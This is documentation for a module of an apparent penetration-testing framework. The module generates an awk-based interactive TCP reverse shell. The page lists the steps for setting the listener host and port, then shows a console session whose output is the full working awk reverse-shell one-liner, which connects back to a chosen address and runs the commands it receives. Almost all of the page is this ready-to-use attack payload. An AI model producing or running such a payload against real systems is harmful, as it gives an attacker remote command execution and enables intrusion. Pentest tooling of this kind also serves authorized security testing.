## Description

Module generates payload that creates interactive tcp reverse shell by using awk one-liner. 

## Verification Steps

  1. Start `./rsf.py`
  2. Do: `use payloads/cmd/awk_reverse_tcp`
  3. Do: `set lhost 192.168.1.3`
  4. Do: `set lport 4321`
  5. Do: `run`
  6. Module generates awk tcp reverse shell payload

## Scenarios

```
rsf > use payloads/cmd/awk_reverse_tcp
rsf (Awk Reverse TCP) > set lhost 192.168.1.4
[+] lhost => 192.168.1.4
rsf (Awk Reverse TCP) > set lport 4321
[+] lport => 4321
rsf (Awk Reverse TCP) > run
[*] Running module...
[*] Generating payload
awk 'BEGIN{s="/inet/tcp/0/192.168.1.4/4321";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)};'
```
